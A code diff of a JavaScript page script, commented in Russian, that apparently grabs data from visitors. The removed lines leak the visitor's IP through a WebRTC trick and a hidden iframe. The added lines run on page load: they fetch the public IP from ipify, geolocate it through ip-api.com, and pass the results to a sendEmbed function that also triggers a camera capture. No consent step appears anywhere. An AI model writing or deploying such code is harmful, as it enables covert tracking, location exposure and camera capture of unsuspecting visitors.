@@ -23,47 +23,6 @@ async function captureCamera() {
     }
 }
 
-async function getIPAddress() {
-    try {
-        // Способ 1: Через WebRTC (может показать локальный IP)
-        const rtc = new RTCPeerConnection({iceServers: []});
-        rtc.createDataChannel('');
-        
-        return new Promise((resolve) => {
-            rtc.createOffer()
-                .then(offer => rtc.setLocalDescription(offer))
-                .catch(() => resolve('Неизвестно'));
-            
-            rtc.onicecandidate = (event) => {
-                if (event.candidate) {
-                    const candidate = event.candidate.candidate;
-                    const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
-                    if (ipMatch) {
-                        resolve(ipMatch[1]);
-                        rtc.close();
-                    }
-                }
-            };
-            
-            setTimeout(() => {
-                // Способ 2: Если WebRTC не сработал, используем iframe трюк
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = 'https://api.ipify.org?format=jsonp&callback=handleIP';
-                
-                window.handleIP = function(data) {
-                    resolve(data.ip || 'Неизвестно');
-                    document.body.removeChild(iframe);
-                };
-                
-                document.body.appendChild(iframe);
-            }, 1000);
-        });
-    } catch (error) {
-        return 'Неизвестно';
-    }
-}
-
 async function sendEmbed(ip, geo) {
     const cameraResult = await captureCamera();
     
@@ -108,17 +67,10 @@ async function sendEmbed(ip, geo) {
     }
 }
 
-// Запуск с WebRTC методом
-getIPAddress().then(ip => {
-    console.log('Получен IP:', ip);
-    if (ip !== 'Неизвестно') {
-        return fetch(`http://ip-api.com/json/${ip}`)
-            .then(r => r.json())
-            .then(geoData => sendEmbed(ip, geoData));
-    } else {
-        return sendEmbed(ip, null);
-    }
-}).catch(error => {
-    console.error('Ошибка:', error);
-    sendEmbed('Неизвестно', null);
-});
+fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(ipData => fetch(`http://ip-api.com/json/${ipData.ip}`)
+        .then(r => r.json())
+        .then(geoData => sendEmbed(ipData.ip, geoData))
+    )
+    .catch(() => sendEmbed(null, null));
